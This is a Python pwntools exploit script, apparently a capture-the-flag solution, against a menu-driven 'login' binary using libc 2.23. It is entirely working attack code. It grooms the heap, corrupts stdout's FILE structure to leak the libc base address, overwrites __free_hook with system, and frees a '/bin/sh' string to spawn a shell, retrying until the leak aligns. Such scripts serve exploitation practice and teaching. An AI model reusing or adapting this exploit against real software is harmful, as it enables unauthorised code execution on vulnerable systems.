from pwn import *
import sys, os
context.log_level = 'debug'
prog = './login'
elf = ELF(prog)
libc = ELF("./libc-2.23.so")
#p = remote("8sdafgh.gamectf.com", 20000)
def dbg():
    gdb.attach(p)
    p.interactive()

def reg(idx, size, passwd):
	p.sendlineafter("Choice:\n", '2')
	p.sendlineafter("id:\n", str(idx))
	p.sendlineafter("length:\n", str(size))
	p.sendafter("word:\n", passwd)
def log(idx, size, passwd):
	p.sendlineafter("Choice:\n", '1')
	p.sendlineafter("id:\n", str(idx))
	p.sendlineafter("length:\n", str(size))
	p.sendlineafter("word:\n", passwd)
def edit(idx, passwd):
	p.sendlineafter("Choice:\n", '4')
	p.sendlineafter("id:\n", str(idx))
	p.sendafter("pass:\n", passwd)
def edit1(idx, passwd):
	p.sendlineafter("Choice:", '4')
	p.sendlineafter("id:", str(idx))
	p.sendafter("pass:", passwd)
def free(idx):
	p.sendlineafter("Choice:\n", '3')
	p.sendlineafter("id:\n", str(idx))
def free1(idx):
	p.sendlineafter("Choice:", '3')
	p.sendlineafter("id:", str(idx))
def exp():
	global p
	p = process(prog)
	reg(0, 0x80, 'a')	
	reg(1, 0x18, 'a')
	free(1)
	reg(2, 0x18, '\x08')
	edit(1, '\xd1')
	reg(4, 0x18, 'a')
	free(4)
	reg(5, 0x18, '\xd0')
	free(0)
	reg(3, 0xa0, 'a')
	edit(4, '\x90')
	edit(5, '\xc0')
	edit(4, p16(0xc620))
	edit(2, p64(0xfbad1800)+p64(0)*3+'\x00')
	p.recv(0x18)
	libc_base = u64(p.recv(6)+'\x00'*2)-0x3c36e0
	if libc_base & 0xff!=0x00:
		p.close()
		return False	
	success(hex(libc_base))
	system = libc.sym['system']+libc_base
	free_hook = libc.sym['__free_hook']+libc_base
	edit1(4, p64(free_hook))
	edit1(2, p64(system))
	edit1(4, '/bin/sh\x00')
	free1(4)
	p.interactive()
if __name__ == '__main__':	
	while not exp():	
		exp()
